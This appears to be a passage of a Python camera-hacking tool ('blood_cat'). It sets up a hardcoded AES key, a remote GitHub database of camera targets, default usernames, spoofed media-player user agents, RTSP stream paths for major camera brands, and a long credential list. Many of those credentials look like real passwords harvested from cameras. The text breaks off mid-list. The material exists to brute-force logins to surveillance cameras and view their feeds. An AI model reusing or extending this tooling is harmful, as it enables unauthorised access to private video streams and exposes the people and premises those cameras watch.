#!/usr/bin/python3
# @Мартин.
# ███████╗              ██╗  ██╗    ██╗  ██╗     ██████╗    ██╗  ██╗     ██╗    ██████╗
# ██╔════╝              ██║  ██║    ██║  ██║    ██╔════╝    ██║ ██╔╝    ███║    ╚════██╗
# ███████╗    █████╗    ███████║    ███████║    ██║         █████╔╝     ╚██║     █████╔╝
# ╚════██║    ╚════╝    ██╔══██║    ╚════██║    ██║         ██╔═██╗      ██║     ╚═══██╗
# ███████║              ██║  ██║         ██║    ╚██████╗    ██║  ██╗     ██║    ██████╔╝
# ╚══════╝              ╚═╝  ╚═╝         ╚═╝     ╚═════╝    ╚═╝  ╚═╝     ╚═╝    ╚═════╝
import re
import os
import sys
import platform
import time
from datetime import datetime
import random
import socket
import base64
import json
import subprocess
from lib.log_cat import LogCat
from lib.location import Location
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
# from lib.calc_io import calcIO 
log = LogCat()


class CamLib():
    def __init__(self):
        self.KEY = b'S-H4CK13@M4ptnh!' 
        self.IV = b'14' + b'\x00' * 14   
        self.SEP = b'\\uE000' 
        self.LOCAL_DB = './data/global.bc'
        self.LOCAL_LAN_DB = './data/lan.lc'
        self.DB = 'https://raw.githubusercontent.com/MartinxMax/db/refs/heads/main/blood_cat/global.bc'
        self.TIMEOUT=3
        self.default_user = "bloodcat"
        self.default_password = "S_H4CK13"
        self.USER = [
            "admin",
            "root",
            "system",
            "camera"
            "Dinion",
            "admin1",
            "Admin",
            "Admin1",
            "ubnt",
            "default",
            "888888",
            "666666",
            "service",
            "supervisor",
            "administrator",
            "Administrator",
            "ADMINISTRATOR",
        ]
        self.USER_AGENTS = [
            "VLC/3.0.18 LibVLC/3.0.18",
            "VLC/3.0.17 LibVLC/3.0.17",
            "VLC/3.0.16 LibVLC/3.0.16",
            "VLC/3.0.15 LibVLC/3.0.15",
            "VLC/3.0.14 LibVLC/3.0.14",
            "VLC/3.0.13 LibVLC/3.0.13",
            "VLC/3.0.12 LibVLC/3.0.12",
            "VLC/3.0.11 LibVLC/3.0.11",
            "VLC/3.0.10 LibVLC/3.0.10",
            "VLC/3.0.9 LibVLC/3.0.9",
            "VLC/3.0.8 LibVLC/3.0.8",
            "VLC/3.0.7 LibVLC/3.0.7",
            "VLC/3.0.6 LibVLC/3.0.6",
            "VLC/3.0.5 LibVLC/3.0.5",
            "VLC/3.0.4 LibVLC/3.0.4",
            "VLC/3.0.3 LibVLC/3.0.3",
            "VLC/3.0.2 LibVLC/3.0.2",
            "VLC/3.0.1 LibVLC/3.0.1",
            "VLC/3.0.0 LibVLC/3.0.0",
            "VLC/2.2.8 LibVLC/2.2.8",
            "VLC/2.2.7 LibVLC/2.2.7",
            "VLC/2.2.6 LibVLC/2.2.6",
            "VLC/2.2.5 LibVLC/2.2.5",
            "VLC/2.2.4 LibVLC/2.2.4",
            "VLC/2.2.3 LibVLC/2.2.3",
            "VLC/2.2.2 LibVLC/2.2.2",
            "VLC/2.2.1 LibVLC/2.2.1",
            "VLC/2.2.0 LibVLC/2.2.0",
            "VLC/2.1.6 LibVLC/2.1.6",
            "VLC/2.1.5 LibVLC/2.1.5",
            "VLC/2.1.4 LibVLC/2.1.4",
            "VLC/2.1.3 LibVLC/2.1.3",
            "VLC/2.1.2 LibVLC/2.1.2",
            "VLC/2.1.1 LibVLC/2.1.1",
            "VLC/2.1.0 LibVLC/2.1.0",
            "VLC/2.0.9 LibVLC/2.0.9",
            "VLC/2.0.8 LibVLC/2.0.8",
            "VLC/2.0.7 LibVLC/2.0.7",
            "VLC/2.0.6 LibVLC/2.0.6",
            "VLC/2.0.5 LibVLC/2.0.5",
            "VLC/2.0.4 LibVLC/2.0.4",
            "VLC/2.0.3 LibVLC/2.0.3",
            "VLC/2.0.2 LibVLC/2.0.2",
            "VLC/2.0.1 LibVLC/2.0.1",
            "VLC/2.0.0 LibVLC/2.0.0",
            "VLC/1.1.13 LibVLC/1.1.13",
            "VLC/1.1.12 LibVLC/1.1.12",
            "VLC/1.1.11 LibVLC/1.1.11",
            "VLC/1.1.10 LibVLC/1.1.10",
            "VLC/1.1.9 LibVLC/1.1.9",
            "VLC/1.1.8 LibVLC/1.1.8",
            "VLC/1.1.7 LibVLC/1.1.7",
            "VLC/1.1.6 LibVLC/1.1.6",
            "VLC/1.1.5 LibVLC/1.1.5",
            "VLC/1.1.4 LibVLC/1.1.4",
            "VLC/1.1.3 LibVLC/1.1.3",
            "VLC/1.1.2 LibVLC/1.1.2",
            "VLC/1.1.1 LibVLC/1.1.1",
            "VLC/1.1.0 LibVLC/1.1.0",
            "VLC/1.0.6 LibVLC/1.0.6",
            "VLC/1.0.5 LibVLC/1.0.5",
            "VLC/1.0.4 LibVLC/1.0.4",
            "VLC/1.0.3 LibVLC/1.0.3",
            "VLC/1.0.2 LibVLC/1.0.2",
            "VLC/1.0.1 LibVLC/1.0.1",
            "VLC/1.0.0 LibVLC/1.0.0",
            "Lavf/59.27.100",
            "Lavf/59.26.100",
            "Lavf/59.25.100",
            "Lavf/59.24.100",
            "Lavf/59.23.100",
            "Lavf/59.22.100",
            "Lavf/59.21.100",
            "Lavf/59.20.100",
            "Lavf/59.19.100",
            "Lavf/59.18.100",
            "Lavf/59.17.100",
            "Lavf/59.16.100",
            "Lavf/59.15.100",
            "Lavf/59.14.100",
            "Lavf/59.13.100",
            "Lavf/59.12.100",
            "Lavf/59.11.100",
            "Lavf/59.10.100",
            "Lavf/59.9.100",
            "Lavf/59.8.100",
            "Lavf/59.7.100",
            "Lavf/59.6.100",
            "Lavf/59.5.100",
            "Lavf/59.4.100",
            "Lavf/59.3.100",
            "Lavf/59.2.100",
            "Lavf/59.1.100",
            "Lavf/59.0.100",
            "Lavf/58.76.100",
            "Lavf/58.75.100",
            "Lavf/58.74.100",
            "Lavf/58.73.100",
            "Lavf/58.72.100",
            "Lavf/58.71.100",
            "Lavf/58.70.100",
            "Lavf/58.69.100",
            "Lavf/58.68.100",
            "Lavf/58.67.100",
            "Lavf/58.66.100",
            "Lavf/58.65.100",
            "Lavf/58.64.100",
            "Lavf/58.63.100",
            "Lavf/58.62.100",
            "Lavf/58.61.100",
            "Lavf/58.60.100",
            "Lavf/58.59.100",
            "Lavf/58.58.100",
            "Lavf/58.57.100",
            "Lavf/58.56.100",
            "Lavf/58.55.100",
            "Lavf/58.54.100",
            "Lavf/58.53.100",
            "Lavf/58.52.100",
            "Lavf/58.51.100",
            "Lavf/58.50.100",
            "MPV/0.35.1",
            "MPV/0.35.0",
            "MPV/0.34.1",
            "MPV/0.34.0",
            "MPV/0.33.1",
            "MPV/0.33.0",
            "MPV/0.32.0",
            "MPV/0.31.0",
            "MPV/0.30.0",
            "MPV/0.29.1",
            "MPV/0.29.0",
            "MPV/0.28.2",
            "MPV/0.28.1",
            "MPV/0.28.0",
            "MPV/0.27.2",
            "MPV/0.27.1",
            "MPV/0.27.0",
            "MPV/0.26.0",
            "MPV/0.25.0",
            "MPV/0.24.0",
            "MPV/0.23.0",
            "MPV/0.22.1",
            "MPV/0.22.0",
            "MPV/0.21.0",
            "MPV/0.20.0",
            "MPV/0.19.0",
            "MPV/0.18.1",
            "MPV/0.18.0",
            "MPV/0.17.0",
            "MPV/0.16.0",
            "MPV/0.15.0",
            "MPV/0.14.0",
            "MPV/0.13.0",
            "MPV/0.12.0",
            "MPV/0.11.0",
            "MPV/0.10.0",
            "MPV/0.9.0",
            "MPV/0.8.0",
            "MPV/0.7.0",
            "MPV/0.6.0",
            "MPV/0.5.0",
            "MPV/0.4.0",
            "MPV/0.3.0",
            "MPV/0.2.0",
            "MPV/0.1.0",
        ]

        self.PATH = [
            "/Streaming/Channels/101",
            "/live",
            "/0",
            "/1",
            "/11",
            "/12",
            "/live.sdp",
            "/Streaming/Channels/102",
            "/Streaming/Channels/1",
            "/Streaming/Channels/1601",
            "/cam/realmonitor?channel=1&subtype=0",
            "/cam/realmonitor?channel=1&subtype=1",
            "/cam/realmonitor",
            "/cam/realmonitor?channel=1&subtype=0&unicast=true&proto=onvif",
            "/axis-media/media.amp",
            "/axis-cgi/mjpg/video.cgi",
            "/axis-cgi/media.cgi",
            "/SNC/media/media.amp",
            "/stream1",
            "/stream2",
            "/videoMain",
            "/videoSub",
            "/h264",
            "/h265",
            "/ch0_0.h264",
            "/ch1_0.h264",
            "/live/ch00_0",
            "/live/ch0",
            "/live/channel1",
            "/live/channel0",
            "/ipcam.sdp",
            "/cam1/h264",
            "/video-stream",
            "/h264_stream",
            "/live_mpeg4.sdp",
            "/media/video1",
            "/media/video2",
            "/unicast/c1/s0/live",
            "/unicast/c2/s1/live",
            "/ucast/1/1",
            "/live/video/profile1",
            "/live/video/profile2",
            "/live/h264",
            "/live/mpeg4",
            "/live/h264_ulaw/VGA",
            "/live/h264_ulaw/HD720P",
            "/live/h264/HD1080",
            "/live/h264/HD1080P",
            "/mpeg4/media.amp?resolution=640x480"
        ]
        # password 1297
        self.PASSWORD = ['', '000000', '00000000', '1111', '111111', '11111111', '1111111111', 'a1234567', 'xabc123x', '1234qwer', 'k1111111', '1qaz2wsX', '1qaz2wsx', 'aa888888', '112233', '11223344', 'a12345678', 'JaNek123', 'new_year', 'pony6697', '121212', '12345abc', 'Queenstown2000', '123', '1234', '12345', '123456', '1234567', '12345678', '123456789', '1234567890', '12345678910', '123456789012', '123123', '123123123', 'powerclub', '12341234', '12344321', '1234512345', '987654321', '9876543210', '4321', '9999', '666666', '888888', '88888888', 'admin', 'Admin123', 'ADMIN123', 'admin123', 'Admin123456', 'admin123456', 'admin123456789', 'admin000', 'admin888', 'admin123!', 'admin@123', 'admin#123', 'admin@123456', 'admin123!@#', '123456admin', 'root', 'root123', 'root123456', 'root123456789', 'roottoor', 'toor', 'administrator', 'Administrator', 'ADMINISTRATOR', 'system', 'System', 'SYSTEM', 'password', 'Password', 'PASSWORD', 'password123', 'password1234', 'password12345', 'password123456', 'pass', 'passw0rd', 'Passw0rd', 'qwerty', 'qwerty123', 'qwerty1234', 'qwerty12345', 'qwertyui', 'qwertyuiop', 'asdfgh', 'asdfgh123', 'zxcvbn', 'zxcvbn123', '1q2w3e4r', '1q2w3e', 'qwe123', 'qweasd', 'qweasd123', '123qweasd', 'qaz123', 'wsx123', 'edc123', 'camera', 'Camera', 'CAMERA', 'security', 'Security', 'SECURITY', 'surveillance', 'Surveillance', 'ipcam', 'IPCam', 'IPCAM', 'dvr', 'DVR', 'nvr', 'NVR', 'hik12345', 'vizxv', 'meinsm', 'fliradmin', 'ikwd', 'jvc', 'ubnt', 'arlo', 'default', 'a123456', '123456a', '12345678a', '123456789a', '123456789!', '123456789abc', '123abc!', 'secretfang12345', 'null', 'NULL', 'none', 'None', 'NONE', 'asdf1234', 'admin12345', 'Pa$$W0rd', 'abc12345', 'Raipl', 'abcd1234', 'hvi12345', '$22zrJYKaZD$', '22222', 'hk123456', 'Pastraveni2025', 'bil2600', 'hzl', 'dm', '1234567a', 'q1234567', 'Caky5765', 'Admin1234', '12345admin', 'youarefucked55', 'Autism321', 'Dm1N1$Tr80R', 'a123456789', 'Aa147258', 'Ziutsy1', 'Aa123456', 'zaq1', 'abcde12345', '1fd660790a4f1de9', 'mb888888', 'as123456', 'yn574289', 'meow', 'deadF00F420', 'admin1234', 'szacun123', 'Xf07732479', '1q2w3e4r5t', '>Zbg0', 'lx6630196', 'Alvia_', 'Enp12345', 'pepel', 'Legio2705', 'abc147258', 'hb123456', 'Wrz', 'sys68216', 'semi1234', '12345qwert', 'Castlecomm1', 'KJCX20233', '12345678q', 'abcd', 'qwert12345', 'Admin', 'dt123456', '123456abc', 'qwer1234', 'BMSP2025.LC', 'deo3113', 'Jolteon24', 'Onsightadmin', 'zq12345678', 'Hfrd', 'git12345', 'tx123456', 'hy123456', 'l88888888', 'qwe12345', 'lf123456', 'i2345678', 'mgv15665409', 'ab123456', 'dl6vwrMLaFZL', 'es182307A', 'Bolton87', 'Sic12465', 'ghth053', '4037204102Mike', 'Aa336699', 'sf123123', 'hd543211', 'dyh86445195', 'syfl3338', 'Admin12345', 'Altitude1', 'K1ngd', '810514wxj', 'HLvn2016', 'Rg528300', 'aaa12345678', '$%Admin', 'ds123456', 'Aa', 'cz1122334455', '12345678as', 'a8528456', 'eliD0314', 'Laibin123', 'aa123456', 'sjht12345', 'hzzx3426', 'admin1122', 'jsdbld', '13IwhH4ZOXveqpM', 'q1234567890', 'admin1964', '2025Hik', 'o87733568a', '12345qwerT', 'ronet999', 'Password1', 'zzb33448', '9037da9efe', 'Power445566', 'tx905433', 'ab19994487834', 'hkws12345', 'Q222a333', '17182326y', 'CYCGcy', 'Slimster953', 'V0ca1va13', 'qaz14725', '092889618XJH', 'Shaldag2023', 'zy', 'tch12345678', 'Volker13', 'abc123456', 'Admin4207', 'dzNbe4hPM2dV', 'ch123456', '0:0:0:0:0:0:0:0:0:0:0:0:', 'mc0558353489', 'cctv', 'xxqh1234', 'BARAJAS2025', 'rgl796186', 'xtbin0985', '1111aaaa', 'wt123456789', 'p3h41ZqHeIOvXwM', 'hondamb100', 'htx87682365', 'knight', 'Chsdltt12345.', 'jkoneneu', 'Macom36963', 'ALHADA', 'elcom123', 'xygg518518', 'Sakhisizwe', 'wersadwersad125', 'VULNERABLE', '123456aa', 'TuanHai', 'Pedicone321', 'hvi13579', 'Hvi12345', '12345678h', 'Top-10$159', 'KrigsWorkV2', 'Kielbaska1234', '12345abcd', 'manager01', 'Vector2457', 'qwerty05', 'N558e2bo$', 'dmin123$', 'hc123456', 'oXhkfZ8mjE', 'Sdcrsm390', 'm2489066', 'Bagong260497', '1234567aA', '141297sA', 'Leon57382', 'OeMw3H1hv4XIpZq', 'ip241702', 'Mist18atCT', 's1234567890', 'AxDistribuidora', 'TatVision16', 'Mpgc2025', 'qminclub', 'segurgal', '_bit_ul', 'janex123', 'a1b2c3d4e5', 'li12345678', 'x10tcsitcsi', 'joel2008', 'A6047Nat', 'danran1165', 'abcd1234abcd', '0744342649claudi', '8$X3', 'z1798953', 'Cannon1124', 'HZSW2019', 'old123456', 'Pass', 'm%7q7lx%Mx$x', 'gr4816615', 'Matthew351', 'Gr', 'SanLom1962', 'lc888888', 'cctv9112', 'one11111', '82222', 'a0912830961', 'tpm123456', 'fjxm7080', 'z1234567', 'yang8088', 'qwer1357', 'ycchoi5467', 'a7654321', 'Speed1987', 'MjsN4AvTq0t1', 'g1', 'ip123456', 'zxc888888', '3Hep1IOqvX4hMwZ', 'QQ510856030', 'jhbw', '123456qq', 'Feathertop', 'ab15179722888', 'bmsm8888', 'hik222888', 'aaa666888', 'GAnLAL9PSLkx4PL', 'Ianphillips42', 'Feenan2017', 'RMq2CUJw54z9', 'leo12345', 'UFUhMovFz', 'hajd12345', '6643532hong', 'Gum250461', 'a2enOI4AVJ28', 'zwtx13579', 'admin335222', 'mwsoft2017', 'xianghe1234', 'Debby-0028', 'admin7119', '123456789k', 'xingyuwg1216', 'tempwin2000', 'gS432569', 'Chino1020', 'SDT', 'altitude2019', 'Lucas2025', 'Balcescu1982', 'pispis123', '0zqbfC', '3hHXqp4wIeMvZO1', 'Hikvision', 'shanken123', 'live123456', 'qaz123456', 'lz88888888', 'admin3454546', 'hvi12345qQ', 'Mamiinma12', 'O4gwZo7VAFY8', 'mdsjk181', '12345qwe', 'qwert', '3Z4pM1wIHXhveOq', 'sws12864', 'tech1507', 'tokata5238', 'aaa111111', 'Aa1234567', 'himlam', 'Btibor1939', 'verz8384', 'fyyd12345', 'Admindiverso', 'Cfl32nvr', 'sd7266773', 'yb1234567890', 'vJo8aY%R1E', 'primarie2018', 'Balje99ga', 'ws121416', 'bk88580005', 'qq542658737', 'Bfci22ZkZGOH', '1234567u', 'hb612235', 'pMJvNmP5SC', '05E$pwZ2hu', 'chen0898', '252525Dhc', 'q1w2e3r4t5', '993d959d6badbb89', 'admin201515', 'dnm', 'Easy1988', 'ZLl', 'Cam842500', 'zh623000', 'root12345', 'h1234567', 'Fakel6264', 'zd123456', 'jda7462211', 'zhang12345', 'ss15885772', 'zsxl2017', 'camara2268', '3213chuj', 'fs888888', 'ABT9$', 'salam', '$11Premium', '0nze-Cet', 't4d3dmmcd9', 'Empt6571', 'qygsdz2024', '53ajoondanna', 'admin.123', 'Hidrocel1979', 'seoni', 'xk666888', 'ml90259279', 'Admin2580', 'Strumore1954', 'dj123456', 'xr123456', 'pIvhZH4XMq1e3wO', 'Aa6511333', '89672041021Morp', 'ayyj12345', 'hik', '56Window', 'Gtny987', 'qt433200', 'v2gEjPu', 'qwerty2016', '123toR123', 'Sat123456', 'Kinor12345', '123456Rs', 'd9ZamydTSf', 'kaesan1', 'Ratio3055', 'sandila03', 'ntp22022', 'kc123456', 'moneta111', 'qwerty13.', '457118aa', 'yz18957881888', 'Sergio2020', 'y$r', 'M4r4guS7673', 'Cactus102', 'H9YflLCabjNz', 'yd39003198', 'rolex12345', 'hk88888888', 'Aim12345', 'Armand321', 'xp605218', 'Gardi1234', 'NIMDA6548a', 'yell2106', 'Zgy281695', '7346348kim.', 'X321x321', 'Abc9469HK', 'Fleenor3', 'qwvIh34epZMHX1O', 'qq123456', 'jh123456', 'jx85492488', 'hMvpew1OqZHX3I4', '1qpwMIHhvOeX4Z3', 'Saf2025', 'n88888888', 'chola12345', '1hMZH4qOepI3wvX', 'NNect13531', 'kmyz3338877', 'hkws123456', 'fk1094B1094', 'Bp236726', '2Jqkr', 'zhx7312075', 'a321s654d987', 'tj589589', 'vi850330', 'smart1976', 'OmniSecure', 'arrob', 'jd123456', 'Sairam1', 'manager1', 'Service1', 'mrAdm1n', 'Qq991525', 'ys123456', 'xf123456', 'lujia274618', 'VkcBgeo610dM', 'Sacofa_p911-supp', 'mac12345', 'yry123456', '690215Kw', 'Nihad123', '123456yy', 'elecsys2022', 'Bgv3641115', 'cqt5861781', 'Sentry2545', 'T3l3ph0ny738374', 'xllt123456', '2913cat$', 'Aa12345678', 'hikvision123', 'ssw123567', 'qwerty95', 'Admin123.', 'rajubhai', 'hykj12345', 'wilbur112', 'goldboss11', 'cmigun2021', 'qwerasd2310', 'dahua.123', 'zcl', 'Gemboy11', 'OdinaThor510', 'lifeisabitch3', 'S12345678', 'Engineering', 'Alyssa', '1d$JWgn5R8Zz', 'yxz86197000', 'Svpr1234', 'S5b', 'Leon2007', 'a1234567890', 'gw147258', 'Video210900', 'Tpce2525', 'CCTV', 'shan4e3F:', 'lbk', 'AOAa1M7wTCEZ', '456456aa', '1234qweR', 'She19830704', '0S1iB%z1X', '12345678m', 'spg123456', 'vToE7QJ082yB', 'aksoy123', 'Nbww0574', 'eg23560600', '1190ymkm', '3IeqwpO1vhM4HXZ', 'yy888888', 'dmstnr123', 'xiang19728', 'bct12345', 'ASDqwe123', 'Vda1234cba', 'buffalo1', 'Taxon', 'c2kXs2fYqQlw', 'Supp0rt.', 'Zl123456', 'ThangTamPass..', 'ecss', 'Margekor3004', 'h4licmmat', 'cd87654321', 'Ziutek1', 'admin22345', 'm1021815816', 'fdc12345', 'OZe3wh1qMpHIXv4', 'dfdyzjc12', 'af123456', '68033411ssp', 'hyhg442713021', 'Ab123456', 'eva2772222', 'Zelten(1059)1', 'archSit', 'Tielt8700', 'Sxrq1234', 'Aq123321', '13461346Sz', 'aaaa1111', 'a8888888', 'smj', 'cz888888', 'Wti61W31e$K3', 'okna2021', '1234567d', 'Alabalanica12', 'TpVg7cl', 'Ccs12345', 'Ostrava//26', 'mdl2007316', 'yezh5688', 'asdf.2025', 'Nellys19', 'dmin123', 'jndv12345', 'FHD13579', 'BauBau12345', 'avd537722', '2FQ', 'a147258369', 'sbtjt112233', 'sck135246', 'jun7879997', 'mwsoft2018', 'rp89672041021', 'Admin1807', 'lex', 'Supp0rt01', 'talia2016', '23Resort', 'wu13833513578', 'Ws123456', 'webcam00', 'pw4kl3inh3ik3n', 'praktiKA45', 'qz112233', 'Prosys7799', 'lq$', '4milpas321', 'q1OvewhMZ3I4pXH', 'alarval2002', 'vhpX1w4ZIeMOH3q', 'veOH31qMpwXI4Zh', 'B9LR$ftNDhlQ', '1012tehnic', 'l12345678', '2308Rk', 'bassfarm1956', 'hj888888', 'we41hIp3ZMqvHXO', 'Us5ENVCxdieo', 'dmin', 'aaa12345', 'Jotech.', 'shaker1234', 'X3ntrion', '3ZpIve1h4OwMXHq', 'lth890225', 'bkkj', 'Wh453685', 'Akim1234', 'Anas', 'Nsecure2215', 'ymhA12345', 'w123456789', 'pgck1314', 'qa123456', 'daniele10286', 'ALZI2551', '.an0mCXA%U', 'a3321457', 'Lovedjdir1', 'jy7733077', 'a88889999', 'ZeY', 'bgdn123456', 'Azvirogiu01', 'Falah', 'lyjyyld12345', 'LEcarabelas3178', 'cmigun2020', 'Dm123456', 'a16441815', 'gxbs5213788', 'china', 'as2020/%', 'S0kol2439', 'zs123456', 'Alanek1983', 'tz888888', 'AV3ql678', 's1234567', 'Ustas111', 'skyline2006', 'qazxsw128', '0KAM1234', '3wHZpXMevIhO41q', 'h43vIpwO1MqHZeX', 'Hoangvan_300878', 'Svarosmeistrai1', '54203719', 'Jbfll418', 'Gtech', 'cd123456', 'ewazxd123S', 'dhyc2869888', 'uho789789', '54321', 'XIpO1h3ZwHMvq4e', 'yous123456', '321654Rikeramu', 'kswm', 'jKgDO9FfJc6', 'MOONstar', '1234567gxHG', 'zoolapet138', 'XIwvOhH1Z4pq3Me', 'Un1v3rs', 'czh12345', 'Nahed888', '43ZXHqehvMO1wpI', 'admin12345678', 'memorasne1', 'WD', 'linshuai11', 'DignaRosa75', 'Ro221181', 'hana19zejna16', 'k8210743', 'Acceso123', 'Maxcqrt11', 'VJ', '0P6X$8wwy', 'ytr654321', 'hellothegreat1', 'ausec251', 'Password3549', 'sspx1234', '06636qaz', 'xt85285067', 'wpMhZOHXev3qI41', 'qwe147258', '123456as', 'ComedyCentral99', 'Ktdq12345', '3M4IZvXHOh1pqwe', '9Batman9', 'az', 'aA12345678', 'canela23', 'Glenco05', 'zh123456', 'rajubhai123', 'kr65717197', '3x3IstNeun', 'ddzy12345', 'S9f', 'Hawk12521254', 'kcW8mfvMD%7b', 'yi84822106yan', 'zc3256717', 'Access6263', 'fn123456', '6ORsLbTMSPhL', 'Kenwood...08', 'wh1234567', 'Par12345', 'jianye12345', 'MwZqOp31vIHh4eX', 'dev', 'a1111111', 'Angelini33', 'oone2014', 'Altinkoy3509', 'Rcgtelecom1215', '8jzYhJVVYfgJ', 'TO', 'HikvisioN', 'Gao302220', 'Automate1', 'S18632711202', 'Hx520568', 'ybo887799', 'liu282725', 'fjkj0395', '4HhZXMwe13vIpOq', 'Camaras2729', 'admin6934', 'rfkj12345', 'cezaevi39', 'iota1953', '9176Pepe', 'Tnc67500', 'service1', 'HeIZvOq3p4whMX1', 'ly123456', '4152polent1.', 'Geenzin01', 'Ess311215', 'hMZHO3Iqvpw4e1X', 'hbyxkj2020', 'G7X31XNCLf0$', 'alfazulu1.', '668a2222', 'Xl123456', 'khanhlinh113', 'dcxxkj123', 'dhht', 'pillo24', '456', 'alwan123', 'e1XwZv4IHMOh3pq', 'ht968188', '3C9JFmOG2oDJ', 'En092701', 'Mak12345', 'bsts1111', 'zzanggubc', 'hathway', 'Pad75sued', 'ewq4HX1hv3IZOpM', '20259876', 'nQ8HH', 'ese12345', 'Yh147258', 'Qwerty12', 'hps13970526940', 'ti2024', 'Omnix3000', 'ja123456', 'hhg12345', '123.admin', '12345678sS', 'upd', 'depsa3110', 'Moka2002', '8CVKQ6', '1Vino', 'orange', 'Susana1965', 'Hf83911222', 'pinot123', 'newpass123', 'Salam', 'rocam2017net', 'xin818623', 'vMHOhXIepZ13q4w', '2241PeoriaSt', 'qXHwZ14MIevhp3O', 'slGVcIZ6wKDD', 'Admin12y', 'clev1997', 'rosmarinus0876', '%te', 'A135790a', 'vhMwpXZHe43O1Iq', 'B0jo5v2XDvc3', 'KubaFun2024', 'test1234', 'nakwoo12', 'ld123456', 'aa881616', 'qwerty123456%', 'Admin888', 'wH1IMvhqZpX4Oe3', 'Przybkowo2015', 'Hikvision12345', 'sx147258', 'Csi12345', 'zzz7726340', 'scs170300', 'timecityfr10', 'rz22399555', 'B18977399376', 'Satcom007', 'Tehno20', '7w34qej8h', 'Xiugai', 'zrd2017zrd', 'DeBr7090', 'ms1234', 'Dict', 'MichA0385', 'z88888888', 'abc12345678', 'abcd123456', 'Thanh1989', 'L0ck3d0ut', 'Kyriakis48', 'syscom1234', 'Kasperlpost', 'yasM25062001', 'cctv0805', 'AdmiN24685', 'Ssth13579', 'onview10366429', 'Esa', 'a8899313', 'dftc', 'jdz1973.', 'krdn5911', 'hornet4116', 'HIaH52Qo09bx', 'md123456', '6977848064', 'Csource54', 'a11111111', 'Mq4XHpO3v1eZIwh', 'laanemere74', 'K6V8GHZwm6Kb', 'yxz888888', 'rkd0g88', 'W1sp3rn3tcctv', 'Paljassaare47', 'Q5C', '05011994', 'Kauppias1', 'Henrypuppydog1', '4qpeMZh1HwI3XOv', 'Elband2025', 'dw123456', 'hwl62837150', 'AjTecninorte-00', 'Cluster12', '33759desk', 'ch01s', 'qckj888888', 'A123456a', 'Admin661', 'Lumanu1401', 'mml', 'Ub8hTdZLP8nR', 'fob79552206', 'Monokopa', 'T3chn0l0gy', 'Evanesce1', 'huajia918', 'time1534', '123456hk', 'manosauga1', 'sj888888', 'XB9vko2YH6', 'cc0d39dd5dbb', 'Vd151115', 'Circular1000', 'leonrenaud1993', 'manera033181', 'tbm', 'mukesh123', 'm6666666', 'cs123456', 'mera01', 'gpn$1', 'Garth', '12zq09gfU', 'tion12126', 'qatar', 'Zone', '2022ch6134', 'simi', 'Dormed120463', 'bullet85', 'cbkb4life', 'Wille135246', 'Hik12345', 'Video', 'Alison2010', '6833dcrd', '1wMZqOeHIh34Xvp', 'marry0522', 'ETT27368021', 'lionel69', '12345678.', 'Bircan15362', '0352.wang', 'control4970', '12345Admin', 'dmin12345', '52375237Aa', 'ad', 'Montelifre16', 'qwer123', 'ykhg1234', 'BlueBell64', 'Ryan1492', 'Tecnicos.c1554', 'dash4209', 'Eduardo4089', 'HikvHeri_10', 'Smile', 'Amzacea123', 'nny2024', 'corsair7', 'Vision-12345', 'veith02626', 'AdminPKKD87773', 'a1234567m', 'afdrun56', 'Ham09091785', 'Quovadis6518', 'Kolomens4', 'urik1791', 'elce2008', 'remez4321', 'ysgst2013', 'L00k1nWW', 'IRLYx$0Rly(z', 'Hik12045', 'server60122483', 'Hi.WorLd', 'qwer4321', 'Sqip1807', 'Gateway5923', 'Sama.2026', 's2a', 'abcd13245', 'dbrdnjfdldlf62', 'qwe13579-', 'VizcomLtd', 'Arsov2025', 'poriental2018', '4qw3vXHh1pMZOIe', 'xaOzZk', 'javid1234', '460Magnum', 'Lyelszo2015', 'IZpHX143OhqwMve', '341667chg54', 'pass1234', 'XZ1qpMIevOhHw43', 'Aa1234', 'lek', 'jpmatus9224006', 'Westholm', 'pegasus123', 'Welcome12', 'Chady1403', 'tecnomatik1', '12345678A', 'admin1464', 'Xtrmmas7', 'inlife.2021', 'Mert247.', 'Telsco6971', 'Century22', 'kmc', '1793Rosen', 'seguritec1930', 'SWAHA2017', '12345.abc', 'gopang1234', 'donow2961188', 'Top12345', 'island63', '12345aaa', 'sp00k3rS', 'cctv0404', 'north3st94', 'Antai8377', 'Rodders100', 'Gasco3400', 'Qwerty', 'Ifsas09', 'Tehno25', 'eboho1', 'benja1234', '3pvOw41IZhHeqXM', 'Macsec6700', '123456Qw', 'ghkdtks403', 'OqM4e31pXhwHIvZ', 'Nokiae52', 'gigabyte1234', '98506828t', 'rodina2016', '13579', 'Peroni2017', 'qXpZwMHeOh31v4I', 'Cloughreagh1', 'IM14evpZwXqhOH3', '0861800018kdl', 'ad123min', 'Salam5464', 'str', 'jamba', 'hackedalexslash1', 'anadolu2020', 'grove2025', 'beiko12345A', 'Premier0112', 'Kamera1234', 'Degla', 'cksnam663', 'CorrisStr33t', 'Conrad8301', '19621962a', 'HDSecure1352', 'jesusraul1212', 'Alzintex', 'Hikv2025', 'Admin131313', 'Spygroup1', '0099Klop', 'Boenpebbles', 'EthanLeane$27', 'Puma', 'pestpest12', 'Elevator17', 'Mandla22', 'Abel1234', 'admintsp14', 'mast1976', 'DS-7616NI-E2', 'idadmin', 'StarB', 'Chrisgio22', 'ScieCCTV23', 'Mach1811/', 'nexo224466', '11054510', 'Manager1', 'M123456s', '4209211', 'pH1wXZOM43vehqI', 'Welcome1', 'leen', 'Admin4321', 'Lassie007', '8T', 'Just4Kix', 'hipra123', '28Tiverton', 'Khku,Exunho22', 'b28zseb28zse', 'Camesec345.', '7(5', 'lsum8E', 'Honda76', 'hvi12345.', 'BATY5847', 'Aa5120237', 'aA3805681', 'Humphrey1', 'Subaru391', 'Spls7757', 'cam123era', 'Noni', 'xx.lange,xx', 'Ch129912', 'COVI2050', 'Hikvision2921', 'pasport12', 'admin321', 'ITAI', 'LottoTotto', 'Doha', 'Kamera01', 'STOPHACKING', 'Manfred18', 'Hikrox247', 'dig321987', 'grupvolvo.123', 'Cctv', 'Rg02yyA0', 'compcam2', 'ays12345', '1Qaz', 'g42004200', 'Rivende11', 'Tech2020', 'Alessia08fi', 'Mtk06134', 'Olivenet', '2025ADMIN2025', 'mssdt1213', '79257inpo', 'O4l', 'User1234', 'CPA20330', 'As172645', 'Roj', 'Apple123', 'arete023', 'm1PteP', 'esle7373', 'sopenco2021', 'Sami0207', '777_Vasya', 'Yukon4118', 'Uags5750', '3000rpmCCTV', 'ys36528331', 'h4IpZOHeq13MXvw', 